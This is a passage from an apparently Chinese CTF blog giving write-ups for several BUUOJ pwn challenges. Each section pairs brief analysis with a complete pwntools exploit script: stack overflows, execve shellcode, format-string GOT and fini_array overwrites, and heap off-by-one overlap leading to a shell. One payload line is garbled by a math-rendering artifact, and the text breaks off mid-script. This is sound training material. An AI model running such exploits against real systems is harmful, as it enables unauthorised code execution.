<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/>
 <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/>
<g transform="translate(2233,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="六、bbys-tu-2016"><a href="#六、bbys-tu-2016" class="headerlink" title="六、bbys_tu_2016"></a>六、bbys_tu_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151052237.png"><span class="image-caption">image-20210826151052237</span></p>
<p>常规checksec一下，32位，开了NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151038100.png"><span class="image-caption">image-20210826151038100</span></p>
<p>进入IDA，发现有个后门函数，并且主函数十分简单，就给了个很明显的溢出，那就直接跳转到后门函数即可</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826150923013.png"><span class="image-caption">image-20210826150923013</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151009378.png"><span class="image-caption">image-20210826151009378</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151024405.png"><span class="image-caption">image-20210826151024405</span></p>
<p>这边就是IDA里面的溢出不对，所以要去gdb里面动态调试计算偏移才行</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151210436.png"><span class="image-caption">image-20210826151210436</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="七、pwnable-start"><a href="#七、pwnable-start" class="headerlink" title="七、pwnable_start"></a>七、pwnable_start</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151445256.png"><span class="image-caption">image-20210826151445256</span></p>
<p>常规checksec，32位，什么保护都没开</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151616994.png"><span class="image-caption">image-20210826151616994</span></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151627593.png"><span class="image-caption">image-20210826151627593</span></p>
<p>进入IDA，只存在start，并没有main函数，只能看汇编</p>
<p>通过直接看汇编，或者进行gdb调试，都能获得输入点距离返回地址长度为0x14</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826165108914.png"><span class="image-caption">image-20210826165108914</span></p>
<p>在gdb里面可以发现，当执行到ret，esp指向的地方存着一个栈上的地址，所以可以据此，我们先跳转到wirte函数，把esp指向的地方输出出来，从而获得栈上地址。</p>
<p>然后，因为跳转程序，同样会再次执行read，此时我们输入的栈地址比我们泄露的栈地址刚好少4个字节，因为最后都会执行到add esp,0x14，所以偏移仍然是0x14，再解释下为什么esp距离我们写入的/bin/sh\x00会差0x18，是因为执行ret时，会执行pop，所以会多4个字节</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826173800838.png"><span class="image-caption">image-20210826173800838</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="八、picoctf-2018-echo-back"><a href="#八、picoctf-2018-echo-back" class="headerlink" title="八、picoctf_2018_echo_back"></a>八、picoctf_2018_echo_back</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182247503.png"><span class="image-caption">image-20210826182247503</span></p>
<p>常规checksec一下，32位，开了NX、Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182506261.png"><span class="image-caption">image-20210826182506261</span></p>
<p>进入IDA，很明显的格式化字符串，跟这篇文章的第五题比较相似。但是少了循环，多了system函数调用，所以我们在劫持got表时需要让程序能再执行一次vuln函数，让我们能输入/bin/sh\x00，不需要泄露libc基址</p>
<p>因为后面有执行puts函数，那可以把puts的got表修改为vuln函数的起始地址</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826191303201.png"><span class="image-caption">image-20210826191303201</span></p>
<p>偏移是7</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826184836372.png"><span class="image-caption">image-20210826184836372</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>





<h2 id="九、ciscn-2019-sw-1"><a href="#九、ciscn-2019-sw-1" class="headerlink" title="九、ciscn_2019_sw_1"></a>九、ciscn_2019_sw_1</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194736365.png"><span class="image-caption">image-20210826194736365</span></p>
<p>常规checksec，32位，开了NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194146179.png"><span class="image-caption">image-20210826194146179</span></p>
<p>进入IDA，这题也是一道格式化字符串，而且仔细看，跟第八题几乎一样，并且也是存在调用了system函数，不需要泄露</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826195039322.png"><span class="image-caption">image-20210826195039322</span></p>
<p>偏移为4</p>
<p>这边因为printf后续也没别的函数，所以要让程序再执行一次就要去找在printf之后，程序还调用了什么东西，然后去把这个修改为main函数地址</p>
<p>linux中在程序结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。所以这边把fini.array中的函数指针改写为main函数地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="十、cmcc-pwnme2"><a href="#十、cmcc-pwnme2" class="headerlink" title="十、cmcc_pwnme2"></a>十、cmcc_pwnme2</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143550209.png"><span class="image-caption">image-20210827143550209</span></p>
<p>常规checksec，32位，开启NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145058312.png"><span class="image-caption">image-20210827145058312</span></p>
<p>进入IDA，程序存在明显溢出，然后存在这个后门函数可以打印flag，也就是我们只需要让string里面放着的是flag即可跳转到这获得flag。</p>
<p>所以先溢出到返回地址，在返回地址填上输入函数gets，往string里面写入flag</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145907550.png"><span class="image-caption">image-20210827145907550</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="十一、hitcontraining-magicheap"><a href="#十一、hitcontraining-magicheap" class="headerlink" title="十一、hitcontraining_magicheap"></a>十一、hitcontraining_magicheap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153019146.png"><span class="image-caption">image-20210827153019146</span></p>
<p>常规checksec，64位，根据题目是道堆题，开了NX、Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153850520.png"><span class="image-caption">image-20210827153850520</span></p>
<p>进入IDA，发现给了个后门函数，好东西</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155315034.png"><span class="image-caption">image-20210827155315034</span></p>
<p>这边如果magic &gt;4869就可以执行到后门函数</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155753245.png"><span class="image-caption">image-20210827155753245</span></p>
<p>漏洞点可以说是十分明显了，这边edit函数里面输入的长度都没有检查的</p>
<p>思路：通过堆溢出，覆盖后面堆块，把堆块申请到magic前面，把magic的值修改成大于4869</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827161445791.png"><span class="image-caption">image-20210827161445791</span></p>
<p>成功getshell</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="十二、hitcontraining-heapcreator"><a href="#十二、hitcontraining-heapcreator" class="headerlink" title="十二、hitcontraining_heapcreator"></a>十二、hitcontraining_heapcreator</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829092850758.png"><span class="image-caption">image-20210829092850758</span></p>
<p>常规checksec，开了NX、Cannary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829094339915.png"><span class="image-caption">image-20210829094339915</span></p>
<p>进入IDA，阅读完代码后，在edit函数中，存在明显的溢出一个字节的漏洞（offbyone）</p>
<p>因为有offbyone漏洞在，那肯定是朝着去修改堆头的大小去的，最终达成overlap</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104050093.png"><span class="image-caption">image-20210829104050093</span></p>
<p>先申请出这些堆块，其中第一个是要申请0x18的，因为这样才能覆盖到下一个堆块的size位。然后因为RELRO和PIE的缘故，我选择劫持got表的方法，所以第四个堆块内容就是写着/bin/sh\x00的。当然，也可以把/bin/sh\x00写到第0个堆块上</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104713815.png"><span class="image-caption">image-20210829104713815</span></p>
<p>此时只要再把这个释放了，然后再申请同样大小的堆块回来，那么我们就可以操控其中本来是第二堆块的内容</p>
<p>然后把可以操控的堆结构内容修改为free的got表地址，从而可以利用show函数打印出libc地址。最后再写入sys即可getshell</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829110519523.png"><span class="image-caption">image-20210829110519523</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span 